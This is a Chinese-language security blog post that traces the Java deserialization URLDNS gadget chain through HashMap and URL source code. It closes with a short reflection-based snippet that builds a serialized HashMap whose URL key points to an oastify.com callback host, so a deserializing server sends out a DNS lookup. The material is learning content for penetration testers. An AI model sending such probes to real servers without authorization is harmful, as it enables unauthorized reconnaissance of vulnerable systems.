---
title: java反序列化之URLDNS链
date: 2026-04-21
tags: 
  - java安全
  - 反序列化专题
  - URLDNS链
categories: 
  - web安全
  - java安全
excerpt: URLDNS利用链解析
---

# java反序列化之URLDNS链

## java反序列化

在 java 中，如果一个对象实现了 Serializable 接口就可以被序列化，java 的这种序列化模式为开发者提供了很多便利，我们可以不必关心具体序列化的过程，只要这个类实现了 Serilizable 接口，这个类的所有属性和方法都会自动序列化，transient 关键字修饰的属性除外，不参与序列化过程。

## URLDNS链

这条利用链有一下特点：

- 不限制 jdk 版本，使用 java 内部类，对第三方依赖没用要求
- 目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞
- URLDNS链只能发起 DNS 请求，并不能进行其他利用。虽然没有任何攻击性，但是在渗透测试的过程中能进行无回显验证

在 ysoserial 中列出的调用链：

```md
*   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
```

### 原理

`java.util.HashMap`重写了`readObject`方法，在反序列化时会调用`hash`函数计算 key 的 hashCode。而`java.net.URL`的 hashCode 在计算时会调用`getHostAddress`来解析域名，从而发出 DNS 请求。

定位到 HashMap#readObject 方法：

```java
private void readObject(ObjectInputStream s)
        throws IOException, ClassNotFoundException {

        ObjectInputStream.GetField fields = s.readFields();

        // Read loadFactor (ignore threshold)
        float lf = fields.get("loadFactor", 0.75f);
        if (lf <= 0 || Float.isNaN(lf))
            throw new InvalidObjectException("Illegal load factor: " + lf);

        lf = Math.clamp(lf, 0.25f, 4.0f);
        HashMap.UnsafeHolder.putLoadFactor(this, lf);

        reinitialize();

        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0) {
            throw new InvalidObjectException("Illegal mappings count: " + mappings);
        } else if (mappings == 0) {
            // use defaults
        } else if (mappings > 0) {
            double dc = Math.ceil(mappings / (double)lf);
            int cap = ((dc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (dc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)dc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

这里我们只需要关注`putVal`方法，这是一个向 HashMap 中存放键值对的方法，这里调用了`hash`方法来处理了 key，定位到`hash`方法：

```java
static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```

可以看到，这里调用了`key.hashCode()`来计算 key 的哈希值。

**在URLDNS利用链中，我们构造的 HashMap 里放的第一个参数就是一个URL对象，所以把 key 用URL对象替换，即调用URL对象的 hashCode方法。**

样例：

```java
HashMap<URL,Integer> hashmap=new HashMap<URL,Integer>();
hashmap.put(new URL("http://sie8dd0dhgeamlivq3kget0i0960uqif.oastify.com"),1);
```

定位到 URL#hashCode 方法：

```java
public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

这里的`synchronized`关键字修饰的方法为同步方法。当`synchronized`方法执行完或发生异常时，会自动释放锁。

这里可以看到调用了`handler.hashCode(this)`，定位到`handler`：

```java
transient URLStreamHandler handler;
```

这是一个`URLStreamHandler`对象，那我们定位到这个类的`hashCode`方法：

```java
protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
        if (addr != null) {
            h += addr.hashCode();
        } else {
            String host = u.getHost();
            if (host != null)
                h += host.toLowerCase(Locale.ROOT).hashCode();
        }

        // Generate the file part.
        String file = u.getFile();
        if (file != null)
            h += file.hashCode();

        // Generate the port part.
        if (u.getPort() == -1)
            h += getDefaultPort();
        else
            h += u.getPort();

        // Generate the ref part.
        String ref = u.getRef();
        if (ref != null)
            h += ref.hashCode();

        return h;
    }
```

`InetAddress addr = getHostAddress(u);`这里调用了`getHostAddress`方法，来看一下是怎么实现的：

```java
synchronized InetAddress getHostAddress() {
        if (hostAddress != null) {
            return hostAddress;
        }

        if (host == null || host.isEmpty()) {
            return null;
        }
        try {
            hostAddress = InetAddress.getByName(host);
        } catch (UnknownHostException | SecurityException ex) {
            return null;
        }
        return hostAddress;
    }
```

`getHostAddress()`这个方法已经是调用链的最底层了，`hostAddress = InetAddress.getByName(host)`是唯一出口，它的内部实现最终会调用一个 Native 方法（由c/cpp实现的底层系统函数），这个 Native 方法会直接调用操作系统的 Socket API，发起 DNS 请求。

至此，从正面的分析结束。

回到最开始的 HashMap#readObject：

```java
for (int i = 0; i < mappings; i++) {
	@SuppressWarnings("unchecked")
	K key = (K) s.readObject();
	@SuppressWarnings("unchecked")
	V value = (V) s.readObject();
	putVal(hash(key), key, value, false, false);
}
```

可以看到，这里的 key 是从`K key = (K) s.readObject();`中经过 readObject 得来的，这说明在这之前必定会有 writeObject 方法来进行序列化。定位到 HashMap#writeObject：

```java
private void writeObject(java.io.ObjectOutputStream s)
        throws IOException {
        int buckets = capacity();
        // Write out the threshold, loadfactor, and any hidden stuff
        s.defaultWriteObject();//这里只是写入hashmap自身的配置参数，并没有攻击性
        s.writeInt(buckets);
        s.writeInt(size);
        internalWriteEntries(s);
    }
```

这里调用了`internalWriteEntries`，定位到它：

```java
 void internalWriteEntries(java.io.ObjectOutputStream s) throws IOException {
        Node<K,V>[] tab;
        if (size > 0 && (tab = table) != null) {
            for (Node<K,V> e : tab) {
                for (; e != null; e = e.next) {
                    s.writeObject(e.key);
                    s.writeObject(e.value);
                }
            }
        }
    }
```

这里的 key 以及 value 是从 table 中取的(table是 HashMap 类的一个成员变量，是整个哈希表的底层存储容器)，具体实现：`transient Node<K,V>[] table;` 

而想要修改table的值，就需要调用 HashMap#put 方法，定位到它：

```java
public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
```

这里也调用了`hash`方法，根据上面所分析的调用链即可发现这里就会产生第一次 DNS 请求。

这里我们仔细思考一下，在第一次put一个URL对象时，会调用这个URL对象的 hashCode 方法，这样我们的hashCode 属性就不为-1，同时，由于我们是在本地构造的，所以在第一次发起 DNS 请求时是由我们本地发起的，并不是由服务器发起的。同时，由于此时我们URL对象的 hashCode 属性已经不为-1，即使上传到服务器上，也不会进行 DNS 请求。

为了避免由我们本地发起的请求被我们误认为是服务器发起的，我们需要用反射进行修改 hashCode 属性，这里给一下样例：

```java
HashMap<URL,Integer> hashMap = new HashMap<>();
URL url=new URL("http://q3uh4dntflrkvpsqhn1ka1po7fd61wpl.oastify.com");

Class<? extends URL> u = url.getClass();
Field hashCode = u.getDeclaredField("hashCode");
hashCode.setAccessible(true);
hashCode.set(url,123);

hashMap.put(url,1);
hashCode.set(url,-1);
```

这样我们序列化之后得到的 hashCode 属性还是-1，当我们上传到服务器上时，反序列化就会进行 put 操作，从而发起 DNS 请求。

现在来总结一下 URLDNS 链的调用过程，我们在本地构造一个 HashMap 对象，序列化之后上传到服务器，服务器在反序列化时一定会触发 HashMap 的 readObject 方法（因为在 JVM 中，`ois.readObject()`发现这是一个 HashMap 对象后，会新建一个 HashMap 对象并调用它的 readObject 方法来反序列化我们上传的字节流），然后触发 hash 方法中的 key 的 hashCode 方法，也就是 URL 对象的 hashCode 方法，在 URL 对象的 hashCode 方法中会触发一个 URLStreamHandler 对象的 hashCode 方法，从而触发内部的 getHostAddress 方法，发起 DNS 请求。

## 总结

URLDNS链是 java 反序列化中非常基础的调用链，这里我花了将近两个晚上来彻底弄明白它的原理，其实是有点慢的，但是我觉得慢没关系，搞懂才是最重要的，希望以后在学习其他调用链时能够更加得心应手。

















